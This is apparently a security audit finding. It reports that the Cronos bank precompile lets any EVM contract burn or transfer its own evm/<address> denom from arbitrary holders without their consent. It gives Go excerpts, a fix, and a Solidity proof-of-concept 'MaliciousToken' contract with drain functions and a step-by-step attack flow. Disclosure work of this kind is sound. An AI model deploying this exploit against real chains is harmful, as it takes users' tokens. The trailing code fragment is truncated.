### Title
Unauthorized Burn and Transfer of Native `evm/<denom>` Tokens via Bank Precompile — (`File: x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `BankContract.Run` function in the bank precompile exposes `burn` and `transfer` methods that accept an arbitrary victim address as the first argument and perform `SendCoinsFromAccountToModule`/`BurnCoins` or `SendCoins` on that address — with **no authorization check** that the calling EVM contract is permitted to act on behalf of that address. Any unprivileged EVM contract can call these methods to burn or transfer native `evm/<caller_address>` tokens from any holder without their consent.

---

### Finding Description

`EVMDenom(contract.Caller())` ties the denom to the calling contract's address, but the precompile never verifies that the address being debited has authorized the caller to act on its behalf.

**`burn` path** (`x/cronos/keeper/precompiles/bank.go`, lines 113–156):

```go
recipient := args[0].(common.Address)   // victim — caller-supplied
addr      := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller()) // "evm/0x<attacker_contract>"
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

**`transfer` path** (lines 167–200):

```go
sender    := args[0].(common.Address)   // victim — caller-supplied
recipient := args[1].(common.Address)   // attacker — caller-supplied
from      := sdk.AccAddress(sender.Bytes())
to        := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller())
bc.bankKeeper.SendCoins(ctx, from, to, ...)
```

The only guard present is `checkBlockedAddr`, which only rejects Cosmos module accounts — it does not verify that `from`/`addr` has approved the calling contract to spend its balance. [1](#0-0) [2](#0-1) [3](#0-2) 

---

### Impact Explanation

**Critical — Unauthorized burn and transfer of precompile-controlled assets.**

An attacker who controls any EVM contract can:

1. Burn `evm/<attacker_contract>` native tokens from any victim address that holds them.
2. Transfer `evm/<attacker_contract>` native tokens from any victim address to themselves.

The `evm/<contract_address>` denom is a real, transferable native Cosmos token. Users accumulate it whenever a CRC20 contract calls `bank.mint(user, amount)` (as shown in `TestBank.sol`'s `moveToNative` pattern). Once users hold these native tokens — e.g., to bridge them via IBC — the contract that originally minted them (or any contract at the same address) can drain them at will. [4](#0-3) [5](#0-4) 

---

### Likelihood Explanation

**High.** The bank precompile is at the well-known address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract with no access restriction. The `EVMDenom` design is documented and the `mint`/`burn`/`transfer` interface is publicly exposed in the ABI. Any attacker who deploys a contract and induces users to hold its corresponding native denom (a realistic scenario for any CRC20 that exposes a `moveToNative`-style function) can immediately exploit this. [6](#0-5) [7](#0-6) 

---

### Recommendation

Add a caller-authorization check inside both the `burn` and `transfer` branches. The simplest correct fix is to require that the address being debited equals `contract.Caller()` (i.e., the contract can only debit itself or its own escrow), or introduce an on-chain allowance mapping keyed by `(owner, spender_contract)` before permitting third-party debits. Concretely:

```go
// burn branch — reject if caller is not burning from itself
if recipient != contract.Caller() {
    return nil, errors.New("burn: caller not authorized to burn from this address")
}

// transfer branch — reject if caller is not the sender
if sender != contract.Caller() {
    return nil, errors.New("transfer: caller not authorized to transfer from this address")
}
``` [8](#0-7) [9](#0-8)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external returns (bool);
    function burn(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Lure users — give them evm/<this_address> native tokens
    function lure(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Drain — burn victim's native tokens without their consent
    function drainBurn(address victim, uint256 amount) external {
        bank.burn(victim, amount);   // no approval required
    }

    // Step 2 (alt): Steal — transfer victim's native tokens to attacker
    function drainTransfer(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);  // no approval required
    }
}
```

**Attack flow:**

1. Attacker deploys `MaliciousToken` at `0xATK`.
2. Attacker calls `lure(victim, 1_000_000)` → victim now holds `1_000_000 evm/0xATK` native tokens (e.g., intending to bridge them via IBC).
3. Attacker calls `drainTransfer(victim, attacker, 1_000_000)` → `bankKeeper.SendCoins(victim → attacker, evm/0xATK)` executes with no revert, transferring the victim's entire balance to the attacker.

The precompile performs no allowance check; `checkBlockedAddr` passes because `victim` is a regular EOA/contract, not a module account. [10](#0-9) [11](#0-10)

func (bc *BankContract) checkBlockedAddr(addr sdk.AccAddress) error {
	to, err := sdk.AccAddressFromBech32(addr.String())
	if err != nil {
		return err
	}
	if bc.bankKeeper.BlockedAddr(to) {
		return errorsmod.Wrapf(errortypes.ErrUnauthorized, "%s is not allowed to receive funds", to.String())

	return nil
